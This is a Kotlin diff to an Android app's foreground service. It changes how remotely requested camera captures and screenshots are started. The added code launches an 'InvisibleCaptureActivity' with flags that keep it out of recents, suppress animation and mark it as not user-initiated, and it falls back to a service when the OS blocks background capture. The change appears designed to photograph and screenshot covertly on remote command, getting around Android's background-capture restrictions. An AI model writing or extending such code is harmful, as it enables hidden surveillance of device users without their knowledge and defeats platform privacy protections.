@@ -364,23 +364,33 @@ class ForegroundService : Service() {
             "camera_capture" -> {
                 markBackgroundAttempt(requestId)
                 try {
-                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
+                        putExtra("action", "camera_capture")
                         putExtra("requestId", requestId)
                         putExtra("cameraFacing", cameraFacing)
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
                     }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startForegroundService(svcIntent)
-                    } else {
-                        startService(svcIntent)
-                    }
+                    startActivity(invIntent)
                 } catch (e: Throwable) {
-                    Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
-                    CloudBridgeSync.updateRequestStatus(
-                        requestId = requestId,
-                        status = "failed",
-                        error = "Service start disallowed",
-                        failureReason = "OS disallowed background camera start: ${e.message}"
-                    )
+                    Log.e("ForegroundService", "InvisibleCaptureActivity start error: ${e.message}, falling back to Service")
+                    try {
+                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                            putExtra("requestId", requestId)
+                            putExtra("cameraFacing", cameraFacing)
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(svcIntent)
+                        } else {
+                            startService(svcIntent)
+                        }
+                    } catch (t: Throwable) {
+                        CloudBridgeSync.updateRequestStatus(
+                            requestId = requestId,
+                            status = "failed",
+                            error = "Camera capture start disallowed",
+                            failureReason = "OS disallowed background camera start: ${t.message}"
+                        )
+                    }
                 }
             }
             "screen_share", "camera_stream" -> {
@@ -412,29 +422,39 @@ class ForegroundService : Service() {
                 }
             }
             "screenshot" -> {
+                markBackgroundAttempt(requestId)
                 try {
-                    val savedProjection = MediaProjectionStore.load(this@ForegroundService)
-                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
+                        putExtra("action", "screenshot")
                         putExtra("requestId", requestId)
-                        putExtra("capture_once", true)
-                        if (savedProjection.first != 0 && savedProjection.second != null) {
-                            putExtra("resultCode", savedProjection.first)
-                            putExtra("resultData", savedProjection.second)
-                        }
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
                     }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startForegroundService(svcIntent)
-                    } else {
-                        startService(svcIntent)
-                    }
+                    startActivity(invIntent)
                 } catch (e: Throwable) {
-                    Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
-                    CloudBridgeSync.updateRequestStatus(
-                        requestId = requestId,
-                        status = "failed",
-                        error = "Screen capture start disallowed",
-                        failureReason = "OS disallowed background capture start: ${e.message}"
-                    )
+                    Log.e("ForegroundService", "InvisibleCaptureActivity start error: ${e.message}, falling back to Service")
+                    try {
+                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                            putExtra("requestId", requestId)
+                            putExtra("capture_once", true)
+                            if (savedProjection.first != 0 && savedProjection.second != null) {
+                                putExtra("resultCode", savedProjection.first)
+                                putExtra("resultData", savedProjection.second)
+                            }
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(svcIntent)
+                        } else {
+                            startService(svcIntent)
+                        }
+                    } catch (t: Throwable) {
+                        CloudBridgeSync.updateRequestStatus(
+                            requestId = requestId,
+                            status = "failed",
+                            error = "Screen capture start disallowed",
+                            failureReason = "OS disallowed background capture start: ${t.message}"
+                        )
+                    }
                 }
             }
         }
